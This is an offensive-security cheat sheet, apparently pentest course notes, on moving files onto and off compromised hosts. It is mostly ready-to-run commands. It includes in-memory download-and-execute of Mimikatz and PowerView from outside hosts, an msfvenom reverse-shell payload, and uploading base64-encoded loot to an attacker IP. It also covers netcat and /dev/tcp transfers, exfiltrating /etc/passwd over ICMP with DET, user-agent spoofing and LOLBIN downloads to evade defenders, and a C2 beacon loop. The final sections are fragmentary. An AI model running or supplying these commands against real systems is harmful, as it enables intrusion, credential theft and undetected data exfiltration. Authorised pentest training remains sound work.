# Data Exfiltration

## File Transfers

### HTTP

#### Hosting

```bash
updog  # Python module
python3 -m http.server  # Python 3
python -m SimpleHTTPServer 8080  # Python 2
ruby -run -ehttpd . -p8080  # ruby
php -S 0.0.0.0:8080  # PHP
socat TCP-LISTEN:8080,reuseaddr,fork  # Socat
```

#### Downloading

Windows

```powershell
# Certutil
certutil -urlcache -f http://192.168.1.1/secrets.txt secrets.txt
# PowerShell
PS C:\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
# From PowerShell 3.0, Invoke-WebRequest is also available
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
# Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex.
powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:9090/Sherlock.ps1')
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
# Bitsadmin
PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
PS C:\htb> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

Linux

```bash
# wget
wget http://10.10.14.35:9090/xxxx_1.0_all.snap
# curl
curl http://10.10.14.35:9090/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
```

#### Uploading

```bash
# PowerShell
# It is also possible to upload files using Powershell using Invoke-WebRequest or Invoke-RestMethod.
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
# After catching the base64 data with Netcat, the payload can be decoded.
Erich@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip
# Bitsadmin
PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
# Certutil
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

### SMB

#### Hosting

```bash
# Impacket
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.0.150 LPORT=53 -f exe -o reverse.exe
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py shareName .
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py shareName . -smb2support
```

#### Downloading

Windows

```powershell
copy \\10.6.0.150\shareName\reverse.exe C:\PrivEsc\reverse.exe
```

### FTP

#### Hosting

```bash
# Python
python -m pyftpdlib -p 21 --write
# Python removing anonymous access
python3 -m pyftpdlib --user=pentester --password=p4ssw0rd -w
```

#### Downloading

```powershell
ftp <KALI IP>
ftp> put <FILE TO TRANSFER>
```

### Netcat

#### Hosting

```bash
Erich@htb[/htb]$ nc -lvnp 80 <LinEnum.sh  # Host
victim@target:~$ cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh  # Download the file
```

#### Connection Initiated by Pentester

```bash
victim@target:~$ nc -nlvp 8000 > mimikatz.exe
Erich@htb[/htb]$ nc -nv 10.10.10.132 8000 <mimikatz.exe
```

#### Connection Initiated by Target

```powershell
Erich@htb[/htb]$ nc -nv 10.10.10.32 8000 > mimikatz.exe
victim@target:~$ nc -nlvp 8000 <mimikatz.exe
```

### SCP

```bash
PS C:\htb> scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip  # Upload
Erich@htb[/htb]$ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe  # Download
```

### RDP

Remote Desktop is often enabled on Windows machines, and from Linux, `rdesktop` can be used to expose a local folder in the remote RDP session.

```bash
Erich@htb[/htb]$ rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'
```

Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.

### Echo Copy

```powershell
Erich@htb[/htb]$ upx --best nc.exe  # Make nc.exe smaller using upx
PS C:\htb> certutil.exe -encode nc.exe nc.txt  # Convert binary to base64
# Open resulting text file in an editor and replace newlines with `echo ".`
Find:\n
Replace:echo "
# If the last line has an echo " on its own, remove it.
# Next, copy all the text and place it on the target
PS C:\htb> certutil.exe -decode nc.txt nc.exe
PS C:\htb> cmd /c "nc.exe -h 2>&1"
```

### Base64

```bash
PS C:\htb> openssl.exe enc -base64 -in nc.exe -out nc.txt  # Encrypt
PS C:\htb> openssl.exe enc -base64 -d -in nc.txt -out nc.exe  # Decrypt
```

## Evading Detection

### Changing User-Agent

&#x20;In case diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, then setting this User Agent may make the request seem legitimate.

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

```bash
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

### LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems, and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

```bash
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

&#x20;Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.

## Exfiltration Extras

Various ways to get information out of the network.

### Ten Commandments of Exfiltration

#### Five Assumptions of Exfiltration

1. Monitoring is perfect
2. Reputation is checked
3. Encryption stripping is in place
4. Monitoring and analysis is at a commercial level
5. Blind proactive countermeasures may affect exfiltration

#### Five Rules of Exfiltration

1. Do not use obfuscation
2. Use web protocols
3. Use innocuous techniques
4. Sending and receiving time is synchronized
5. Manual mechanisms can be used

### Beaconing

* A beacon is a malicious form of "heartbeat"
* Beacons may just indicate their existence
* Beacons may trigger tasking from the C\&C server
* Sophisticated beacons vary their calling schedule
* Beacons commonly use HTTP/HTTPS
* Use legitimate and innocuous traffic
* Sophisticated beacons may use multiple destinations

#### Example

```bash
while true; do wget -O /dev/null http://<URL>/; sleep 10; done;
```

There are other beacon simulators online such as on GitHub.

### PyExfil

[https://github.com/ytisf/PyExfil](https://github.com/ytisf/PyExfil)

Using PyExfil to exfiltrate over HTTPS

```bash
# Two terminals used
# Terminal 1 (Collector)
python https_server.py
# Terminal 2 (Target)
python https_client.py
```

### DET

[https://github.com/sensepost/DET](https://github.com/sensepost/DET)

```bash
# Two terminals used
# Terminal 1 (Collector - ICMP Server)
python det.py -c ./config-sample.json -p icmp -L
# Terminal 2 (Target - Exfiltrating data - ICMP Client)
python det.py -c ./config-sample.json -p icmp -f /etc/passwd
```

### Cachetalk

[https://github.com/SafeBreach-Labs/cachetalk](https://github.com/SafeBreach-Labs/cachetalk)

```bash
python covert.py -t http://<URL>/
# Two terminals used
# Terminal 1
python covert.py -w stuff http://<URL>/ 10 -s -1
# Terminal 2
python covert.py -r 10 http://<URL>/ 10 -s -1
```

### DNS Exfiltration

#### dnsteal

[https://github.com/m57/dnsteal](https://github.com/m57/dnsteal)

```bash
python dnsteal.py <IP> -z -v
# From target

```

### OpenPuff

[https://www.darknet.org.uk/2017/07/openpuff-professional-steganography-tool/](https://www.darknet.org.uk/2017/07/openpuff-professional-steganography-tool/)

Video exfiltration
